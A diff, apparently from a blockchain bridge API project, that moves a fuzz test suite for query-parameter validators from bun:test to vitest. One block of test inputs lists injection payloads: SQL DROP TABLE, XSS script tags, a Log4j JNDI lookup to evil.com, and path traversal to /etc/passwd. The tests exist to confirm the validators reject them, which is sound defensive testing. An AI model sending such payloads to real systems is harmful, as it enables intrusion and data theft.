@@ -1,88 +1,92 @@
-import { describe, test, expect, beforeEach, mock } from "bun:test";
+import { describe, test, expect, beforeEach, vi } from 'vitest';
+
 import {
 	validateTransactionQueryParams,
 	validateTransactionByDepositCountQueryParams,
 	validateMappingsQueryParams,
 	validateTokenMetadataQueryParams,
-	validateClaimProofQueryParams,
-} from "../../src/middlewares/validate_query_params";
+	validateClaimProofQueryParams
+} from '../../src/middlewares/validate_query_params.ts';
 
 // Mock servercore classes
-class MockBadRequestError extends Error {
-	constructor(
-		message: string,
-		public details?: any,
-		public statusCode?: number,
-		public context?: any
-	) {
-		super(message);
-		this.name = "BadRequestError";
+const { MockBadRequestError } = vi.hoisted(() => {
+	class MockBadRequestError extends Error {
+		details?: any;
+		statusCode?: number;
+		context?: any;
+
+		constructor(message: string, details?: any, statusCode?: number, context?: any) {
+			super(message);
+			this.details = details;
+			this.statusCode = statusCode;
+			this.context = context;
+			this.name = 'BadRequestError';
+		}
 	}
-}
+	return { MockBadRequestError };
+});
 
-const mockHandleError = mock(() => Promise.resolve());
+const mockHandleError = vi.hoisted(() => vi.fn(() => Promise.resolve()));
 
-// NOTE: deliberately no mock.module of "../../src/middlewares/response_context"
-// here. Bun's mock.module is process-global for the whole `bun test` run, so a
-// module mock registered in this file leaks into every test file that loads
-// after it. When file discovery order put this file before
-// response_context.test.ts (order differs per filesystem), that file ended up
-// testing the mock instead of the real implementation and failed. The real
+// NOTE: deliberately no vi.mock of "../../src/middlewares/response_context"
+// here (carried over from the original bun:test suite, where mock.module is
+// process-global for the whole run, so a module mock registered in this file
+// leaked into every test file that loaded after it). The real
 // getResponseContext is side-effect-free with the contexts used below, so no
 // mock is needed. ApiError is included in the servercore mock because the real
 // response_context module imports it.
-mock.module("@polygonlabs/servercore", () => ({
+vi.mock('@polygonlabs/servercore', () => ({
 	ApiError: class ApiError extends Error {},
 	BadRequestError: MockBadRequestError,
-	handleError: mockHandleError,
+	handleError: mockHandleError
 }));
 
-describe("Fuzzy Tests for API Parameter Validations", () => {
+describe('Fuzzy Tests for API Parameter Validations', () => {
 	let mockContext: any;
-	let mockNext: ReturnType<typeof mock>;
+	let mockNext: ReturnType<typeof vi.fn<() => Promise<void>>>;
 
 	beforeEach(() => {
-		mockNext = mock(() => Promise.resolve());
+		mockNext = vi.fn<() => Promise<void>>(() => Promise.resolve());
 		mockHandleError.mockClear();
 
 		mockContext = {
 			req: {
-				param: mock(() => ({})),
-				query: mock(() => ({})),
+				param: vi.fn(() => ({})),
+				query: vi.fn(() => ({}))
 			},
-			set: mock(() => {}),
+			set: vi.fn(() => {})
 		};
 	});
 
-	describe("Ethereum Address Fuzzing", () => {
+	describe('Ethereum Address Fuzzing', () => {
 		const invalidAddresses = [
-			"0x", // Too short
-			"0x123", // Too short
-			"0x1234567890abcdef1234567890abcdef1234567", // Too short (39 chars)
-			"0x1234567890abcdef1234567890abcdef123456789", // Too long (41 chars)
-			"0x1234567890abcdef1234567890abcdef1234567g", // Invalid character 'g'
-			"1234567890abcdef1234567890abcdef12345678", // Missing 0x prefix
-			"0X1234567890abcdef1234567890abcdef12345678", // Capital X
-			"0x1234567890abcdef1234567890abcdef12345678 ", // Trailing space
-			" 0x1234567890abcdef1234567890abcdef12345678", // Leading space
-			"0x\u00001234567890abcdef1234567890abcdef12345678", // Null byte
-			"0x1234567890abcdef\n1234567890abcdef12345678", // Newline
-			"0x1234567890abcdef\t1234567890abcdef12345678", // Tab
-			"0x" + "z".repeat(40), // All invalid hex chars
-			"0x" + "🚀".repeat(20), // Unicode chars
-			"invalid-address",
-			"0xinvalid",
-			"", // Empty string should fail for address regex
+			'0x', // Too short
+			'0x123', // Too short
+			'0x1234567890abcdef1234567890abcdef1234567', // Too short (39 chars)
+			'0x1234567890abcdef1234567890abcdef123456789', // Too long (41 chars)
+			'0x1234567890abcdef1234567890abcdef1234567g', // Invalid character 'g'
+			'1234567890abcdef1234567890abcdef12345678', // Missing 0x prefix
+			'0X1234567890abcdef1234567890abcdef12345678', // Capital X
+			'0x1234567890abcdef1234567890abcdef12345678 ', // Trailing space
+			' 0x1234567890abcdef1234567890abcdef12345678', // Leading space
+			'0x\u00001234567890abcdef1234567890abcdef12345678', // Null byte
+			'0x1234567890abcdef\n1234567890abcdef12345678', // Newline
+			'0x1234567890abcdef\t1234567890abcdef12345678', // Tab
+			'0x' + 'z'.repeat(40), // All invalid hex chars
+			'0x' + '🚀'.repeat(20), // Unicode chars
+			'invalid-address',
+			'0xinvalid',
+			'' // Empty string should fail for address regex
 		];
 
 		// Optional address fields - null/undefined should be valid
-		test("should reject invalid Ethereum addresses in optional transaction query fields", async () => {
+		test('should reject invalid Ethereum addresses in optional transaction query fields', async () => {
 			for (const invalidAddress of invalidAddresses) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
+					network: 'testnet'
 				});
 				mockContext.req.query.mockReturnValueOnce({
-					fromAddress: invalidAddress,
+					fromAddress: invalidAddress
 				});
 
 				await validateTransactionQueryParams(mockContext, mockNext);
@@ -92,12 +96,12 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 
 		// Optional address fields should accept undefined but reject null
-		test("should accept undefined for optional address fields in transactions", async () => {
+		test('should accept undefined for optional address fields in transactions', async () => {
 			mockContext.req.param.mockReturnValueOnce({
-				network: "testnet",
+				network: 'testnet'
 			});
 			mockContext.req.query.mockReturnValueOnce({
-				fromAddress: undefined,
+				fromAddress: undefined
 			});
 
 			await validateTransactionQueryParams(mockContext, mockNext);
@@ -105,12 +109,12 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 			expect(mockNext).toHaveBeenCalled();
 		});
 
-		test("should reject null for optional address fields (null is not undefined)", async () => {
+		test('should reject null for optional address fields (null is not undefined)', async () => {
 			mockContext.req.param.mockReturnValueOnce({
-				network: "testnet",
+				network: 'testnet'
 			});
 			mockContext.req.query.mockReturnValueOnce({
-				fromAddress: null,
+				fromAddress: null
 			});
 
 			await validateTransactionQueryParams(mockContext, mockNext);
@@ -118,13 +122,13 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 
 		// Optional address fields in mappings
-		test("should reject invalid addresses in optional mappings query fields", async () => {
+		test('should reject invalid addresses in optional mappings query fields', async () => {
 			for (const invalidAddress of invalidAddresses) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
+					network: 'testnet'
 				});
 				mockContext.req.query.mockReturnValueOnce({
-					originTokenAddress: invalidAddress,
+					originTokenAddress: invalidAddress
 				});
 
 				await validateMappingsQueryParams(mockContext, mockNext);
@@ -134,18 +138,14 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 
 		// Required address fields - should reject null/undefined/empty
-		test("should reject invalid addresses in required token metadata fields", async () => {
-			const requiredFieldInvalidAddresses = [
-				...invalidAddresses,
-				null,
-				undefined,
-			];
+		test('should reject invalid addresses in required token metadata fields', async () => {
+			const requiredFieldInvalidAddresses = [...invalidAddresses, null, undefined];
 
 			for (const invalidAddress of requiredFieldInvalidAddresses) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
+					network: 'testnet',
 					tokenAddress: invalidAddress,
-					tokenNetwork: "1",
+					tokenNetwork: '1'
 				});
 
 				await validateTokenMetadataQueryParams(mockContext, mockNext);
@@ -155,33 +155,33 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 	});
 
-	describe("Network Parameter Fuzzing", () => {
+	describe('Network Parameter Fuzzing', () => {
 		const invalidNetworks = [
-			"mainnet123", // Invalid suffix
-			"testnet-v2", // Invalid format
-			"MAINNET", // Wrong case
-			"TESTNET", // Wrong case
-			"localnet", // Not allowed
-			"polygon", // Wrong network name
-			"ethereum", // Wrong network name
-			"", // Empty string
-			" ", // Space
-			"main net", // Space in middle
-			"test\nnet", // Newline
-			"main\0net", // Null byte
-			"🌐network", // Unicode
+			'mainnet123', // Invalid suffix
+			'testnet-v2', // Invalid format
+			'MAINNET', // Wrong case
+			'TESTNET', // Wrong case
+			'localnet', // Not allowed
+			'polygon', // Wrong network name
+			'ethereum', // Wrong network name
+			'', // Empty string
+			' ', // Space
+			'main net', // Space in middle
+			'test\nnet', // Newline
+			'main\0net', // Null byte
+			'🌐network', // Unicode
 			null,
 			undefined,
 			123, // Number
 			true, // Boolean
 			{}, // Object
-			[], // Array
+			[] // Array
 		];
 
-		test("should reject invalid network parameters", async () => {
+		test('should reject invalid network parameters', async () => {
 			for (const invalidNetwork of invalidNetworks) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: invalidNetwork,
+					network: invalidNetwork
 				});
 				mockContext.req.query.mockReturnValueOnce({});
 
@@ -192,7 +192,7 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 	});
 
-	describe("Numeric Parameter Fuzzing", () => {
+	describe('Numeric Parameter Fuzzing', () => {
 		// const invalidNumbers = [
 		// 	"-1", // Negative
 		// 	"-999", // Large negative
@@ -221,22 +221,16 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		// 	true, // Boolean
 		// ];
 
-		test("should reject truly invalid limit parameters but accept null/undefined", async () => {
+		test('should reject truly invalid limit parameters but accept null/undefined', async () => {
 			// These should fail even with z.coerce.number() - non-coercible values
-			const definitelyInvalidNumbers = [
-				"abc",
-				"123abc",
-				"∞",
-				"①",
-				"９９９",
-			];
+			const definitelyInvalidNumbers = ['abc', '123abc', '∞', '①', '９９９'];
 
 			for (const invalidNumber of definitelyInvalidNumbers) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
+					network: 'testnet'
 				});
 				mockContext.req.query.mockReturnValueOnce({
-					limit: invalidNumber,
+					limit: invalidNumber
 				});
 
 				await validateTransactionQueryParams(mockContext, mockNext);
@@ -245,12 +239,12 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 			}
 		});
 
-		test("should accept undefined for limit parameters (uses default value)", async () => {
+		test('should accept undefined for limit parameters (uses default value)', async () => {
 			mockContext.req.param.mockReturnValueOnce({
-				network: "testnet",
+				network: 'testnet'
 			});
 			mockContext.req.query.mockReturnValueOnce({
-				limit: undefined,
+				limit: undefined
 			});
 
 			await validateTransactionQueryParams(mockContext, mockNext);
@@ -258,13 +252,13 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 			expect(mockNext).toHaveBeenCalled();
 		});
 
-		test("should accept null for limit parameters (coerces to 0, which is valid)", async () => {
+		test('should accept null for limit parameters (coerces to 0, which is valid)', async () => {
 			// z.coerce.number() converts null to 0, and 0 is nonnegative
 			mockContext.req.param.mockReturnValueOnce({
-				network: "testnet",
+				network: 'testnet'
 			});
 			mockContext.req.query.mockReturnValueOnce({
-				limit: null,
+				limit: null
 			});
 
 			await validateTransactionQueryParams(mockContext, mockNext);
@@ -272,76 +266,52 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 			expect(mockNext).toHaveBeenCalled();
 		});
 
-		test("should reject invalid deposit count parameters (required, regex validation)", async () => {
+		test('should reject invalid deposit count parameters (required, regex validation)', async () => {
 			// These are required fields with regex /^\d*$/ - should reject everything invalid
-			const allInvalidForRegex = [
-				"-1",
-				"1.5",
-				"abc",
-				"123abc",
-				"",
-				" ",
-				null,
-				undefined,
-			];
+			const allInvalidForRegex = ['-1', '1.5', 'abc', '123abc', '', ' ', null, undefined];
 
 			for (const invalidNumber of allInvalidForRegex) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
+					network: 'testnet',
 					depositCount: invalidNumber,
-					sourceNetworkId: "1",
+					sourceNetworkId: '1'
 				});
 
-				await validateTransactionByDepositCountQueryParams(
-					mockContext,
-					mockNext
-				);
+				await validateTransactionByDepositCountQueryParams(mockContext, mockNext);
 				expect(mockHandleError).toHaveBeenCalled();
 				mockHandleError.mockClear();
 			}
 		});
 
-		test("should reject invalid source network IDs (required, regex validation)", async () => {
+		test('should reject invalid source network IDs (required, regex validation)', async () => {
 			// These are required fields with regex /^\d*$/ - should reject everything invalid
-			const allInvalidForRegex = [
-				"-1",
-				"1.5",
-				"abc",
-				"123abc",
-				"",
-				" ",
-				null,
-				undefined,
-			];
+			const allInvalidForRegex = ['-1', '1.5', 'abc', '123abc', '', ' ', null, undefined];
 
 			for (const invalidNumber of allInvalidForRegex) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
-					depositCount: "1",
-					sourceNetworkId: invalidNumber,
+					network: 'testnet',
+					depositCount: '1',
+					sourceNetworkId: invalidNumber
 				});
 
-				await validateTransactionByDepositCountQueryParams(
-					mockContext,
-					mockNext
-				);
+				await validateTransactionByDepositCountQueryParams(mockContext, mockNext);
 				expect(mockHandleError).toHaveBeenCalled();
 				mockHandleError.mockClear();
 			}
 		});
 
-		test("should reject non-coercible proof query parameters", async () => {
+		test('should reject non-coercible proof query parameters', async () => {
 			// z.coerce.number().int().nonnegative() should reject these
-			const nonCoercibleNumbers = ["abc", "123abc", "∞", "①", "９９９"];
+			const nonCoercibleNumbers = ['abc', '123abc', '∞', '①', '９９９'];
 
 			for (const invalidNumber of nonCoercibleNumbers) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
+					network: 'testnet'
 				});
 				mockContext.req.query.mockReturnValueOnce({
 					depositCount: invalidNumber,
-					sourceNetworkId: "1",
-					leafIndex: "1",
+					sourceNetworkId: '1',
+					leafIndex: '1'
 				});
 
 				await validateClaimProofQueryParams(mockContext, mockNext);
@@ -350,18 +320,18 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 			}
 		});
 
-		test("should reject negative numbers in proof queries (nonnegative validation)", async () => {
+		test('should reject negative numbers in proof queries (nonnegative validation)', async () => {
 			// Test the nonnegative constraint
-			const negativeValues = ["-1", "-999"];
+			const negativeValues = ['-1', '-999'];
 
 			for (const negativeValue of negativeValues) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
+					network: 'testnet'
 				});
 				mockContext.req.query.mockReturnValueOnce({
 					depositCount: negativeValue,
-					sourceNetworkId: "1",
-					leafIndex: "1",
+					sourceNetworkId: '1',
+					leafIndex: '1'
 				});
 
 				await validateClaimProofQueryParams(mockContext, mockNext);
@@ -371,31 +341,31 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 	});
 
-	describe("Network IDs Array Fuzzing", () => {
+	describe('Network IDs Array Fuzzing', () => {
 		const invalidNetworkIds = [
-			"1,2,abc", // Mixed valid/invalid
-			",1,2", // Leading comma
-			"1,2,", // Trailing comma
-			"1.5,2.7", // Decimals
-			"-1,2,3", // Negative numbers
-			"1,2,3,", // Trailing comma
-			"1\n2\n3", // Newlines instead of commas
-			"1|2|3", // Wrong separator
-			"[1,2,3]", // JSON array format
-			"1;2;3", // Semicolon separator
-			"one,two,three", // Text numbers
-			"1,2,∞", // Unicode infinity
-			"0x1,0x2", // Hex format
-			"1e1,1e2", // Scientific notation
+			'1,2,abc', // Mixed valid/invalid
+			',1,2', // Leading comma
+			'1,2,', // Trailing comma
+			'1.5,2.7', // Decimals
+			'-1,2,3', // Negative numbers
+			'1,2,3,', // Trailing comma
+			'1\n2\n3', // Newlines instead of commas
+			'1|2|3', // Wrong separator
+			'[1,2,3]', // JSON array format
+			'1;2;3', // Semicolon separator
+			'one,two,three', // Text numbers
+			'1,2,∞', // Unicode infinity
+			'0x1,0x2', // Hex format
+			'1e1,1e2' // Scientific notation
 		];
 
-		test("should reject invalid network ID arrays in transaction queries (optional field)", async () => {
+		test('should reject invalid network ID arrays in transaction queries (optional field)', async () => {
 			for (const invalidIds of invalidNetworkIds) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
+					network: 'testnet'
 				});
 				mockContext.req.query.mockReturnValueOnce({
-					sourceNetworkIds: invalidIds,
+					sourceNetworkIds: invalidIds
 				});
 
 				await validateTransactionQueryParams(mockContext, mockNext);
@@ -404,12 +374,12 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 			}
 		});
 
-		test("should accept undefined for optional network ID arrays", async () => {
+		test('should accept undefined for optional network ID arrays', async () => {
 			mockContext.req.param.mockReturnValueOnce({
-				network: "testnet",
+				network: 'testnet'
 			});
 			mockContext.req.query.mockReturnValueOnce({
-				sourceNetworkIds: undefined,
+				sourceNetworkIds: undefined
 			});
 
 			await validateTransactionQueryParams(mockContext, mockNext);
@@ -417,25 +387,25 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 			expect(mockNext).toHaveBeenCalled();
 		});
 
-		test("should reject null for optional network ID arrays", async () => {
+		test('should reject null for optional network ID arrays', async () => {
 			mockContext.req.param.mockReturnValueOnce({
-				network: "testnet",
+				network: 'testnet'
 			});
 			mockContext.req.query.mockReturnValueOnce({
-				sourceNetworkIds: null,
+				sourceNetworkIds: null
 			});
 
 			await validateTransactionQueryParams(mockContext, mockNext);
 			expect(mockHandleError).toHaveBeenCalled();
 		});
 
-		test("should reject invalid network ID arrays in mappings queries (optional field)", async () => {
+		test('should reject invalid network ID arrays in mappings queries (optional field)', async () => {
 			for (const invalidIds of invalidNetworkIds) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
+					network: 'testnet'
 				});
 				mockContext.req.query.mockReturnValueOnce({
-					originNetworkIds: invalidIds,
+					originNetworkIds: invalidIds
 				});
 
 				await validateMappingsQueryParams(mockContext, mockNext);
@@ -445,7 +415,7 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 	});
 
-	describe("Timestamp Fuzzing", () => {
+	describe('Timestamp Fuzzing', () => {
 		// const invalidTimestamps = [
 		// "999999999999", // Too short (12 digits)
 		// "10000000000000", // Too long (14 digits)
@@ -477,12 +447,12 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		// 	}
 		// });
 
-		test("should accept undefined for optional timestamp fields", async () => {
+		test('should accept undefined for optional timestamp fields', async () => {
 			mockContext.req.param.mockReturnValueOnce({
-				network: "testnet",
+				network: 'testnet'
 			});
 			mockContext.req.query.mockReturnValueOnce({
-				updatedSince: undefined,
+				updatedSince: undefined
 			});
 
 			await validateTransactionQueryParams(mockContext, mockNext);
@@ -490,12 +460,12 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 			expect(mockNext).toHaveBeenCalled();
 		});
 
-		test("should reject null for optional timestamp fields", async () => {
+		test('should reject null for optional timestamp fields', async () => {
 			mockContext.req.param.mockReturnValueOnce({
-				network: "testnet",
+				network: 'testnet'
 			});
 			mockContext.req.query.mockReturnValueOnce({
-				updatedSince: null,
+				updatedSince: null
 			});
 
 			await validateTransactionQueryParams(mockContext, mockNext);
@@ -503,43 +473,43 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 	});
 
-	describe("Enum Value Fuzzing", () => {
+	describe('Enum Value Fuzzing', () => {
 		const invalidOrderValues = [
-			"ASC", // Wrong case
-			"DESC", // Wrong case
-			"ascending", // Full word
-			"descending", // Full word
-			"up", // Alternative
-			"down", // Alternative
-			"1", // Numeric
-			"0", // Numeric
-			"true", // Boolean string
-			"desc ", // Trailing space
-			" asc", // Leading space
-			"as\0c", // Null byte
-			"de\nsc", // Newline
+			'ASC', // Wrong case
+			'DESC', // Wrong case
+			'ascending', // Full word
+			'descending', // Full word
+			'up', // Alternative
+			'down', // Alternative
+			'1', // Numeric
+			'0', // Numeric
+			'true', // Boolean string
+			'desc ', // Trailing space
+			' asc', // Leading space
+			'as\0c', // Null byte
+			'de\nsc' // Newline
 		];
 
 		const invalidStatusValues = [
-			"bridged", // Wrong case
-			"PENDING", // Not in enum
-			"COMPLETED", // Not in enum
-			"FAILED", // Not in enum
-			"IN_PROGRESS", // Not in enum
-			"bridged,claimed", // Multiple values
-			"BRIDGED ", // Trailing space
-			" CLAIMED", // Leading space
-			"CLAIM\0ED", // Null byte
-			"BRIDGE\nD", // Newline
+			'bridged', // Wrong case
+			'PENDING', // Not in enum
+			'COMPLETED', // Not in enum
+			'FAILED', // Not in enum
+			'IN_PROGRESS', // Not in enum
+			'bridged,claimed', // Multiple values
+			'BRIDGED ', // Trailing space
+			' CLAIMED', // Leading space
+			'CLAIM\0ED', // Null byte
+			'BRIDGE\nD' // Newline
 		];
 
-		test("should reject invalid order values", async () => {
+		test('should reject invalid order values', async () => {
 			for (const invalidOrder of invalidOrderValues) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
+					network: 'testnet'
 				});
 				mockContext.req.query.mockReturnValueOnce({
-					order: invalidOrder,
+					order: invalidOrder
 				});
 
 				await validateTransactionQueryParams(mockContext, mockNext);
@@ -548,13 +518,13 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 			}
 		});
 
-		test("should reject invalid status values", async () => {
+		test('should reject invalid status values', async () => {
 			for (const invalidStatus of invalidStatusValues) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
+					network: 'testnet'
 				});
 				mockContext.req.query.mockReturnValueOnce({
-					status: invalidStatus,
+					status: invalidStatus
 				});
 
 				await validateTransactionQueryParams(mockContext, mockNext);
@@ -564,29 +534,29 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 	});
 
-	describe("Injection Attack Fuzzing", () => {
+	describe('Injection Attack Fuzzing', () => {
 		const maliciousInputs = [
 			"'; DROP TABLE users; --", // SQL injection
 			"<script>alert('xss')</script>", // XSS
-			"${jndi:ldap://evil.com/a}", // Log4j injection
-			"{{7*7}}", // Template injection
-			"../../../etc/passwd", // Path traversal
-			"file:///etc/passwd", // File URL
-			"javascript:alert(1)", // JavaScript URL
-			"data:text/html,<script>alert(1)</script>", // Data URL
-			"\u0000", // Null byte
-			"\uFEFF", // BOM
-			"\r\n", // CRLF
-			"%00", // URL encoded null
-			"%0A", // URL encoded newline
-			"%22%3E%3Cscript%3Ealert%281%29%3C/script%3E", // URL encoded XSS
+			'${jndi:ldap://evil.com/a}', // Log4j injection
+			'{{7*7}}', // Template injection
+			'../../../etc/passwd', // Path traversal
+			'file:///etc/passwd', // File URL
+			'javascript:alert(1)', // JavaScript URL
+			'data:text/html,<script>alert(1)</script>', // Data URL
+			'\u0000', // Null byte
+			'\uFEFF', // BOM
+			'\r\n', // CRLF
+			'%00', // URL encoded null
+			'%0A', // URL encoded newline
+			'%22%3E%3Cscript%3Ealert%281%29%3C/script%3E' // URL encoded XSS
 		];
 
-		test("should reject malicious inputs in all string fields", async () => {
+		test('should reject malicious inputs in all string fields', async () => {
 			const testFields = [
-				{ param: { network: "testnet" }, query: { fromAddress: "" } },
-				{ param: { network: "testnet" }, query: { startAfter: "" } },
-				{ param: { network: "" }, query: {} },
+				{ param: { network: 'testnet' }, query: { fromAddress: '' } },
+				{ param: { network: 'testnet' }, query: { startAfter: '' } },
+				{ param: { network: '' }, query: {} }
 			];
 
 			for (const maliciousInput of maliciousInputs) {
@@ -612,24 +582,24 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 	});
 
-	describe("Unicode and Encoding Fuzzing", () => {
+	describe('Unicode and Encoding Fuzzing', () => {
 		const unicodeInputs = [
-			"0x1234567890abcdef1234567890abcdef1234567８", // Full-width 8
-			"０ｘ1234567890abcdef1234567890abcdef12345678", // Full-width 0 and x
-			"0x１２３４５６７８９０ａｂｃｄｅｆ１２３４５６７８９０ａｂｃｄｅｆ１２３４５６７８", // All full-width
-			"0x\u200B1234567890abcdef1234567890abcdef12345678", // Zero-width space
-			"0x\u200D1234567890abcdef1234567890abcdef12345678", // Zero-width joiner
-			"0x\u20001234567890abcdef1234567890abcdef12345678", // En quad
-			"ｍａｉｎｎｅｔ", // Full-width mainnet
-			"🌐mainnet", // Emoji prefix
-			"mainnet🚀", // Emoji suffix
+			'0x1234567890abcdef1234567890abcdef1234567８', // Full-width 8
+			'０ｘ1234567890abcdef1234567890abcdef12345678', // Full-width 0 and x
+			'0x１２３４５６７８９０ａｂｃｄｅｆ１２３４５６７８９０ａｂｃｄｅｆ１２３４５６７８', // All full-width
+			'0x\u200B1234567890abcdef1234567890abcdef12345678', // Zero-width space
+			'0x\u200D1234567890abcdef1234567890abcdef12345678', // Zero-width joiner
+			'0x\u20001234567890abcdef1234567890abcdef12345678', // En quad
+			'ｍａｉｎｎｅｔ', // Full-width mainnet
+			'🌐mainnet', // Emoji prefix
+			'mainnet🚀' // Emoji suffix
 		];
 
-		test("should handle unicode and encoding variations", async () => {
+		test('should handle unicode and encoding variations', async () => {
 			for (const unicodeInput of unicodeInputs) {
 				// Test as network parameter
 				mockContext.req.param.mockReturnValueOnce({
-					network: unicodeInput,
+					network: unicodeInput
 				});
 				mockContext.req.query.mockReturnValueOnce({});
 
@@ -639,10 +609,10 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 
 				// Test as address
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
+					network: 'testnet'
 				});
 				mockContext.req.query.mockReturnValueOnce({
-					fromAddress: unicodeInput,
+					fromAddress: unicodeInput
 				});
 
 				await validateTransactionQueryParams(mockContext, mockNext);
@@ -652,31 +622,31 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 	});
 
-	describe("Large Input Fuzzing", () => {
-		test("should reject extremely long inputs", async () => {
-			const longString = "a".repeat(10000);
-			const longAddress = "0x" + "1".repeat(10000);
-			const longNetworkIds = Array(1000).fill("1").join(",");
+	describe('Large Input Fuzzing', () => {
+		test('should reject extremely long inputs', async () => {
+			const longString = 'a'.repeat(10000);
+			const longAddress = '0x' + '1'.repeat(10000);
+			const longNetworkIds = Array(1000).fill('1').join(',');
 
 			const testCases = [
 				{ network: longString },
-				{ network: "testnet", query: { fromAddress: longAddress } },
+				{ network: 'testnet', query: { fromAddress: longAddress } },
 				{
-					network: "testnet",
-					query: { sourceNetworkIds: longNetworkIds },
+					network: 'testnet',
+					query: { sourceNetworkIds: longNetworkIds }
 				},
-				{ network: "testnet", query: { startAfter: longString } },
+				{ network: 'testnet', query: { startAfter: longString } }
 			];
 
 			for (const testCase of testCases) {
 				if (testCase.query) {
 					mockContext.req.param.mockReturnValueOnce({
-						network: testCase.network,
+						network: testCase.network
 					});
 					mockContext.req.query.mockReturnValueOnce(testCase.query);
 				} else {
 					mockContext.req.param.mockReturnValueOnce({
-						network: testCase.network,
+						network: testCase.network
 					});
 					mockContext.req.query.mockReturnValueOnce({});
 				}
@@ -688,20 +658,20 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 	});
 
-	describe("Type Confusion Fuzzing", () => {
+	describe('Type Confusion Fuzzing', () => {
 		const confusingTypes = [
-			{ toString: () => "mainnet", valueOf: undefined }, // Object with toString
-			{ valueOf: () => "testnet", toString: undefined }, // Object with valueOf
-			"mainnet", // String object
+			{ toString: () => 'mainnet', valueOf: undefined }, // Object with toString
+			{ valueOf: () => 'testnet', toString: undefined }, // Object with valueOf
+			'mainnet', // String object
 			1, // Number object
-			Symbol("mainnet"), // Symbol
-			BigInt(1), // BigInt
+			Symbol('mainnet'), // Symbol
+			BigInt(1) // BigInt
 		];
 
-		test("should handle type confusion attempts", async () => {
+		test('should handle type confusion attempts', async () => {
 			for (const confusingType of confusingTypes) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: confusingType,
+					network: confusingType
 				});
 				mockContext.req.query.mockReturnValueOnce({});
 
@@ -713,29 +683,29 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 	});
 
-	describe("Boundary Value Fuzzing", () => {
-		test("should handle boundary values correctly", async () => {
+	describe('Boundary Value Fuzzing', () => {
+		test('should handle boundary values correctly', async () => {
 			const boundaryTests = [
 				// Limit boundaries
-				{ query: { limit: "0" } }, // Minimum valid
-				{ query: { limit: "2147483647" } }, // Max 32-bit int
-				{ query: { limit: "2147483648" } }, // Max 32-bit int + 1
+				{ query: { limit: '0' } }, // Minimum valid
+				{ query: { limit: '2147483647' } }, // Max 32-bit int
+				{ query: { limit: '2147483648' } }, // Max 32-bit int + 1
 
 				// Timestamp boundaries
-				{ query: { updatedSince: "1000000000000" } }, // Min valid timestamp
-				{ query: { updatedSince: "9999999999999" } }, // Max valid timestamp
-				{ query: { updatedSince: "999999999999" } }, // Just under min
-				{ query: { updatedSince: "10000000000000" } }, // Just over max
+				{ query: { updatedSince: '1000000000000' } }, // Min valid timestamp
+				{ query: { updatedSince: '9999999999999' } }, // Max valid timestamp
+				{ query: { updatedSince: '999999999999' } }, // Just under min
+				{ query: { updatedSince: '10000000000000' } }, // Just over max
 
 				// Address boundaries
-				{ query: { fromAddress: "0x" + "0".repeat(40) } }, // All zeros
-				{ query: { fromAddress: "0x" + "f".repeat(40) } }, // All f's
-				{ query: { fromAddress: "0x" + "F".repeat(40) } }, // All F's
+				{ query: { fromAddress: '0x' + '0'.repeat(40) } }, // All zeros
+				{ query: { fromAddress: '0x' + 'f'.repeat(40) } }, // All f's
+				{ query: { fromAddress: '0x' + 'F'.repeat(40) } } // All F's
 			];
 
 			for (const test of boundaryTests) {
 				mockContext.req.param.mockReturnValueOnce({
-					network: "testnet",
+					network: 'testnet'
 				});
 				mockContext.req.query.mockReturnValueOnce(test.query);
 
@@ -747,8 +717,8 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 		});
 	});
 
-	describe("Concurrent Request Simulation", () => {
-		test("should handle concurrent validation requests", async () => {
+	describe('Concurrent Request Simulation', () => {
+		test('should handle concurrent validation requests', async () => {
 			const promises = [];
 
 			// Simulate 100 concurrent requests with various invalid inputs
@@ -756,22 +726,17 @@ describe("Fuzzy Tests for API Parameter Validations", () => {
 				const context = {
 					...mockContext,
 					req: {
-						param: mock(() => ({
-							network: i % 2 === 0 ? "testnet" : "invalid",
+						param: vi.fn(() => ({
+							network: i % 2 === 0 ? 'testnet' : 'invalid'
 						})),
-						query: mock(() => ({
-							fromAddress:
-								i % 3 === 0
-									? "invalid"
-									: "0x1234567890abcdef1234567890abcdef12345678",
